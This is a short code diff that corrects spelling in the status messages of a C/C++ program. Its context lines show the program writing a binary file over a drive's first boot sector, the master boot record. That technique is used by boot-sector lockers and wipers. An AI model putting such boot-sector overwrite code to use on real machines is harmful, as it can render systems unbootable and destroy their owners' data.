@@ -15,10 +15,10 @@ void main() {
 			if (size > 0) {
 				byte *mbr = new byte[size];
 				if (ReadFile(binary, mbr, size, &dw, 0)) {
-					printf("Binary file successfuly read!\n");
+					printf("Binary file successfully read!\n");
 					//Writes the bin file to the first boot sector on the drive. 
 					if (WriteFile(drive, mbr, size, &dw, 0)) {
-						printf("First sector overritten successfuly!\n");
+						printf("First sector overwritten successfully!\n");
 					}
 					else
 						printf("Fatal error! Cannot override 1st sector!\n");
